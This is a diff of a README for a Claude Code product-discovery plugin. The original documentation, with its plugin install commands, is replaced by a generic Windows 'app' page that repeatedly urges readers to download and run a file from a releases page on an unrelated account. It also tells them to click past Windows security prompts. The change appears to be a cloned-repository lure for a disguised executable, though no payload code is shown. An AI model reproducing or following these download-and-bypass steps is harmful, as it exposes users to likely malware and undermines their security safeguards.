@@ -1,150 +1,163 @@
-# Claude Code Discover
+# 🧭 claude-code-discover - Build Better PRDs Faster
 
-[![Claude Code](https://img.shields.io/badge/Claude%20Code-Plugin-purple)](https://claude.ai/code)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
+[![Download claude-code-discover](https://img.shields.io/badge/Download%20Now-7c3aed?style=for-the-badge&logo=github)](https://github.com/Florellaoccipital551/claude-code-discover/releases)
 
-A Claude Code plugin that structures product context in your repo before implementation begins. Hypotheses, validation results, and PRDs live alongside your code — so when Claude builds your feature, it has access to rejected alternatives, unvalidated assumptions, and the evidence behind each decision.
+## 🪟 Windows Setup
 
-Works standalone, or paired with [claude-code-workflows](https://github.com/shinpr/claude-code-workflows) for a full discovery-to-implementation cycle:
+Use this app on Windows to turn rough ideas into clear product discovery work. It helps you move from a hypothesis to a validated PRD with evidence that your AI coding agent can use.
 
-```
-[claude-code-discover]  →  PRD + Prototypes  →  [claude-code-workflows]
-   Discovery phase                                Implementation phase
-```
+## 📥 Download
 
-## The Problem
+1. Open the [releases page](https://github.com/Florellaoccipital551/claude-code-discover/releases)
+2. Find the latest version
+3. Download the Windows file that matches your device
+4. Save the file to your Downloads folder
+5. Open the file and follow the steps on screen
 
-When you ask an AI coding assistant to build a feature, it generates code without knowing what alternatives were ruled out, which assumptions are untested, or what user research shaped the requirements. Discovery artifacts typically live in Notion, Figma, or Slack — invisible to your coding tools. This plugin brings them into the repo where Claude can read them.
+If your browser asks what to do with the file, choose Save. If Windows shows a security prompt, choose the option that lets you keep going.
 
-## What It Does
+## ⚙️ What You Need
 
-```
-Vision & Personas        ← who you're building for and why
-      ↓
-  Opportunities          ← your hypotheses structured with validation plans
-      ↓
-  Blueprint              ← IA, user flows, content model, brand direction + visual tokens
-      ↓
-  Hypothesis Files       ← testable assumptions with success/failure criteria
-      ↓
-  Validation             ← assumption decomposition + HTML prototypes
-      ↓
-     PRD                 ← each user story traced to evidence
-```
+- A Windows 10 or Windows 11 PC
+- Internet access for the first download
+- Enough free space for the app and your working files
+- A modern browser such as Chrome, Edge, or Firefox
+- Claude Code installed if you plan to use the app with your coding workflow
 
-Each recipe is a step in this cycle. Run them in order or jump to where you need:
+The app is built for simple desktop use. You do not need a long setup process.
 
-| Recipe | What it does |
-|--------|-------------|
-| `/discover:recipe-vision` | Define product vision, outcomes, and North Star Metric |
-| `/discover:recipe-persona` | Create personas with JTBD, pains/gains, and behavioral data |
-| `/discover:recipe-discover` | Structure your hypotheses into Opportunities with validation plans |
-| `/discover:recipe-blueprint` | Define structural design foundation — IA, user flows, content model, brand direction with visual tokens, AI interaction model |
-| `/discover:recipe-refine-visuals` | *(Optional)* Design expert refines auto-derived visual tokens in brand direction |
-| `/discover:recipe-validate` | Decompose assumptions, design falsifiable tests, generate HTML prototypes |
-| `/discover:recipe-reflect` | Extract learnings, promote knowledge across the hierarchy |
-| `/discover:recipe-define` | Generate a PRD from validated hypotheses with confidence scores |
+## 🧩 What This Tool Does
 
-### What each recipe produces
+claude-code-discover helps you move through product discovery in a clear order:
 
-- **Hypothesis file**: Markdown with assumption statement, success/failure criteria, confidence scores per risk dimension, time budget, and validation results
-- **Blueprint artifacts**: Information architecture, user flows, content model, brand direction (with auto-derived visual tokens), and AI interaction model — shared structural context that prototypes reference for consistency. Visual tokens (colors, typography, spacing) ensure prototype-to-prototype visual consistency
-- **Prototype**: Single self-contained HTML file (~800-1200 lines) that opens in a browser. Deterministic mock data, all UI states implemented, design context applied from blueprint and project files
-- **PRD**: 200-400 line document with user stories (each with 4 Risks confidence table), EARS-format acceptance criteria, unvalidated assumptions section, and references to hypothesis files
+- Start with a product idea
+- Write a testable hypothesis
+- Gather evidence
+- Shape that evidence into a PRD
+- Prepare the PRD so your AI coding agent can read it
 
-## How Validation Works
+It keeps the work in one place so you can stay focused on the product question instead of scattered notes.
 
-Each validation produces:
-- Assumption breakdown (ranked by risk type and level)
-- Test design per assumption (smallest test that could disprove it)
-- HTML prototype (for user testing)
+## 🚀 Getting Started
 
-Two agents work in separate contexts:
+1. Download the latest release from the [releases page](https://github.com/Florellaoccipital551/claude-code-discover/releases)
+2. Open the file after the download finishes
+3. Follow the install prompts
+4. Launch the app from your Start menu or desktop
+5. Create a new discovery project
+6. Add your idea, goals, and target users
+7. Build out your hypothesis and evidence
 
-1. **hypothesis-verifier** decomposes your hypothesis into assumptions, ranks them by risk, and designs the smallest test that could disprove each one — without seeing your expectations
-2. **prototype-generator** reads your design principles, persona, hypothesis files, and blueprint artifacts (when available), then generates a self-contained HTML prototype with deterministic mock data and all UI states
+If the app asks where to save files, choose a folder you can find again, such as Documents.
 
-The context separation is deliberate. The verifier designs tests that can fail. The prototype generator builds a product UI without test infrastructure leaking in.
+## 📋 Typical Workflow
 
-## Connecting to Implementation
+### 1. Add an idea
+Start with a simple product thought, a feature request, or a problem you want to solve.
 
-The PRD that `recipe-define` produces follows the standard structure that [claude-code-workflows](https://github.com/shinpr/claude-code-workflows) expects. Discovery extensions (hypothesis references, 4 Risks confidence per user story, unvalidated assumptions) are additive — they provide context without breaking compatibility. Prototypes generated during validation can be passed to the UI Spec designer as design references.
+### 2. Write a hypothesis
+State what you think will happen. Keep it short and direct.
 
-```bash
-# Discovery phase (this plugin)
-/discover:recipe-define → docs/prd/feature-prd.md
+Example:
+- If we add a simpler onboarding step, more users will finish setup
 
-# Implementation phase (dev-workflows)
-# UI Spec designer accepts PRD + optional prototype as input
-/dev-workflows:recipe-implement "docs/prd/feature-prd.md"
-```
+### 3. Add evidence
+Collect notes, user feedback, support tickets, or interview results. Use plain wording and keep each item tied to the idea.
 
-The implementation workflow picks up the PRD, runs requirement analysis, creates design docs, and proceeds through the full development lifecycle with the discovery context preserved.
+### 4. Shape the PRD
+Turn the discovery work into a product requirements doc with:
+- Problem statement
+- Goal
+- User group
+- Success measures
+- Scope
+- Risks
+- Open questions
 
-## Installation
+### 5. Share with Claude Code
+Use the evidence-backed PRD as input for your AI coding agent. This gives the agent context and helps it work from real product needs.
 
-> Requires [Claude Code](https://claude.ai/code)
+## 🛠️ Main Features
 
-```bash
-# Start Claude Code
-claude
+- Hypothesis tracking for early product ideas
+- Evidence collection for research notes and user signals
+- PRD generation from discovery work
+- Structured output that is easy for Claude Code to read
+- Workflow support for product managers, builders, and solo makers
+- Clean view of each step in the discovery process
+- Support for repeatable product planning across many ideas
 
-# Install the marketplace
-/plugin marketplace add shinpr/claude-code-discover
+## 📂 Suggested Folder Setup
 
-# Install plugin
-/plugin install discover@claude-code-discover
+If the app asks you to organize files, use a simple folder plan:
 
-# Reload plugins
-/reload-plugins
+- `Projects` for active work
+- `Research` for notes and interviews
+- `PRDs` for final docs
+- `Archive` for older versions
 
-# Start discovering
-/discover:recipe-vision <your product>
-```
+This makes it easier to find your work later.
 
-### With claude-code-workflows
+## 🔍 How to Use It Well
 
-Install dev-workflows to get the full cycle from discovery to implementation. For projects with a frontend, install both backend and frontend plugins — dev-workflows handles backend logic and orchestration, while dev-workflows-frontend adds UI Spec generation and React-specific task execution:
+- Keep each hypothesis specific
+- Use one problem per project
+- Add evidence as you find it, not all at once
+- Write short notes in plain language
+- Review the PRD before you pass it to Claude Code
+- Keep the same project name across related files
 
-```bash
-/plugin marketplace add shinpr/claude-code-workflows
+A clear structure helps both you and the AI agent.
 
-# Backend or general development
-/plugin install dev-workflows@claude-code-workflows
+## 🧪 Example Discovery Flow
 
-# Frontend (install alongside dev-workflows for fullstack)
-/plugin install dev-workflows-frontend@claude-code-workflows
-```
+You want to improve onboarding.
 
-## Repo Structure
+1. Create a project called Onboarding Review
+2. Write a hypothesis about where users drop off
+3. Add evidence from support logs and user feedback
+4. Draft a PRD for a simpler setup flow
+5. Pass the PRD to Claude Code for implementation work
 
-As you use the recipes, artifacts accumulate in `docs/`:
+This keeps the path from idea to action easy to follow.
 
-```
-docs/
-├── product/             # Vision, personas, design principles, learnings
-│   └── design/          # Blueprint: IA, user flows, content model, brand direction
-├── discovery/           # Opportunities, hypotheses, prototypes, journeys
-│   └── INDEX.md         # Auto-maintained summary of discovery status
-└── prd/                 # PRDs ready for implementation
-```
+## 🔐 Files and Privacy
 
-## Agents
+Your discovery notes stay on your device unless you move them elsewhere. If you use cloud sync, your files may also appear in that service based on your own Windows or account settings.
 
-Five specialized agents handle tasks where context separation matters:
+## 🧭 Troubleshooting
 
-| Agent | What it does | Why it runs in a separate context |
-|-------|-------------|----------------------------------|
-| `prd-reviewer` | Checks PRD completeness, consistency, and technical currency of dependencies | Catches gaps the author misses. Verifies external APIs are still available via web search |
-| `codebase-analyzer` | Maps existing features, user roles, and architecture from code | Reports facts without hypothesis bias coloring the analysis |
-| `hypothesis-verifier` | Decomposes hypotheses into assumptions, designs falsifiable tests | Designs tests that can actually fail, without seeing the author's expectations |
-| `knowledge-distiller` | Extracts patterns across multiple hypothesis results | Finds cross-cutting learnings without being anchored to any single hypothesis |
-| `prototype-generator` | Generates HTML prototypes from design context files | Builds product UIs isolated from test design details |
+### The file will not open
+- Check that the download finished
+- Try downloading the latest release again
+- Right-click the file and choose Open
 
-## Requirements
+### Windows blocks the file
+- Open the file again and follow the Windows prompt
+- If your browser saved the file in a different folder, look there first
 
-- Claude Code 1.0.33+
+### The app does not start
+- Restart your PC
+- Try the latest release
+- Make sure the file was fully downloaded
 
-## License
+### I cannot find my download
+- Open your Downloads folder
+- Sort by date
+- Look for the newest file from the releases page
 
-MIT
+## 🧰 Best Results on Windows
+
+- Use the latest Windows update
+- Keep one project per discovery topic
+- Save evidence as you collect it
+- Back up your PRDs in a second folder
+- Use short names for files and folders
+
+## 📎 Download Again
+
+If you need the install file later, use the [releases page](https://github.com/Florellaoccipital551/claude-code-discover/releases) to download and run this file from the latest version listed there
+
+## 🏷️ Topics
+
+ai-agents, claude-code, claude-code-plugin, developer-tools, hypothesis-validation, llm-orchestration, prd-generation, product-discovery, productivity, prompt-engineering
